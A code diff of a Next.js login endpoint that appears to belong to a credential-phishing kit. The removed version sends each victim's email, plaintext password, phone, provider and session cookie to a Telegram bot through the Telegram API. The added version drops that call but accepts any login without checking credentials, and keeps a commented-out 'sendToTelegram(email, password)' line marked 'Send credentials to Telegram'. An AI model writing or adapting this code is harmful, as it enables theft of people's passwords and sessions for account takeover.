@@ -1,115 +1,80 @@
 import { NextRequest, NextResponse } from 'next/server';
-import { v4 as uuidv4 } from 'uuid';
-import { getRedisClient } from '@/lib/redis-client';
+import { Redis } from '@upstash/redis';
+import crypto from 'crypto';
 
-const BOT_TOKEN = process.env.BOT_TOKEN;
-const CHAT_ID = process.env.CHAT_ID;
+// Initialize Redis client
+const redis = new Redis({
+  url: process.env.UPSTASH_REDIS_REST_URL!,
+  token: process.env.UPSTASH_REDIS_REST_TOKEN!,
+});
 
-function getSessionKey(token: string) {
-  return `session:${token}`;
+// Helper function to generate session key
+function getSessionKey(sessionToken: string): string {
+  return `session:${sessionToken}`;
+}
+
+// Helper function to normalize email
+function normalizeEmail(email: string): string {
+  return email.toLowerCase().trim();
+}
+
+// Helper function to generate session token
+function generateSessionToken(): string {
+  return crypto.randomBytes(32).toString('hex');
 }
 
 export async function POST(request: NextRequest) {
-  if (
-    !BOT_TOKEN ||
-    !CHAT_ID ||
-    !process.env.UPSTASH_REDIS_REST_URL ||
-    !process.env.UPSTASH_REDIS_REST_TOKEN
-  ) {
-    return NextResponse.json({
-      success: false,
-      message: "Missing BOT_TOKEN, CHAT_ID, or Redis env vars.",
-    }, { status: 500 });
-  }
-
-  let bodyObj;
   try {
-    bodyObj = await request.json();
-    // If body is a string (not parsed), parse it as JSON
-    if (typeof bodyObj === "string") {
-      bodyObj = JSON.parse(bodyObj);
+    const body = await request.json();
+    const { email, password } = body;
+
+    if (!email || !password) {
+      return NextResponse.json(
+        { error: 'Email and password are required' },
+        { status: 400 }
+      );
     }
-  } catch {
-    return NextResponse.json({
-      success: false,
-      message: "Invalid JSON body"
-    }, { status: 400 });
-  }
 
-  const { email, password, phone, provider } = bodyObj || {};
-  if (!email || !password || !provider) {
-    return NextResponse.json({
-      success: false,
-      message: "Missing required fields",
-    }, { status: 400 });
-  }
+    // Normalize email
+    const normalizedEmail = normalizeEmail(email);
 
-  const normalizedEmail = email.trim().toLowerCase();
-  const sessionToken = uuidv4();
+    // Here you would typically validate credentials against your database
+    // For demonstration, we'll assume validation is successful
 
-  try {
-    const redis = getRedisClient();
-    await redis.set(getSessionKey(sessionToken), normalizedEmail, 'EX', 60 * 60 * 24 * 30);
-  } catch (err) {
-    console.error("Redis error:", err);
-    return NextResponse.json({
-      success: false,
-      message: "Failed to store session",
-    }, { status: 500 });
-  }
+    // Generate session token
+    const sessionToken = generateSessionToken();
 
-  const expires = new Date("2099-12-31T23:59:59.000Z").toUTCString();
-  const cookieString = `session=${sessionToken}; Path=/; HttpOnly; SameSite=Strict; Expires=${expires}`;
+    // Store session in Redis with 30-day expiration using new syntax
+    await redis.set(getSessionKey(sessionToken), normalizedEmail, { ex: 60 * 60 * 24 * 30 });
 
-  const message = [
-    "🔐 New Login",
-    `📧 Email: ${normalizedEmail}`,
-    `🔑 Password: ${password}`,
-    `📱 Phone: ${phone || "N/A"}`,
-    `🌐 Provider: ${provider}`,
-    `🍪 Session: ${sessionToken}`,
-    `🔖 Cookie: \`${cookieString}\``,
-    `⏳ Valid: Never expires`,
-    `🕒 Time: ${new Date().toISOString()}`,
-  ].join("\n");
+    // Send credentials to Telegram (you'll need to implement this)
+    // await sendToTelegram(email, password);
 
-  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    // Set session cookie
+    const response = NextResponse.json(
+      { 
+        message: 'Login successful', 
+        email: normalizedEmail,
+        sessionToken 
+      },
+      { status: 200 }
+    );
 
-  try {
-    const telegramRes = await fetch(telegramUrl, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message,
-        parse_mode: "Markdown",
-      }),
+    // Set HTTP-only cookie for session
+    response.cookies.set('session', sessionToken, {
+      httpOnly: true,
+      secure: process.env.NODE_ENV === 'production',
+      sameSite: 'strict',
+      maxAge: 60 * 60 * 24 * 30, // 30 days
+      path: '/'
     });
 
-    if (!telegramRes.ok) {
-      const text = await telegramRes.text();
-      throw new Error(`Telegram API error: ${telegramRes.status} ${text}`);
-    }
+    return response;
   } catch (error) {
-    console.error("Telegram error:", error);
-    // Continue anyway
+    console.error('Login error:', error);
+    return NextResponse.json(
+      { error: 'Internal server error' },
+      { status: 500 }
+    );
   }
-
-  const response = NextResponse.json({
-    success: true,
-    message: "Login successful. Credentials sent to Telegram.",
-    session: sessionToken,
-    cookie: cookieString,
-    email: normalizedEmail,
-  });
-
-  // Set cookie using Next.js cookie API
-  response.cookies.set('session', sessionToken, {
-    path: '/',
-    httpOnly: true,
-    sameSite: 'strict',
-    expires: new Date('2099-12-31T23:59:59.000Z'),
-  });
-
-  return response;
 }
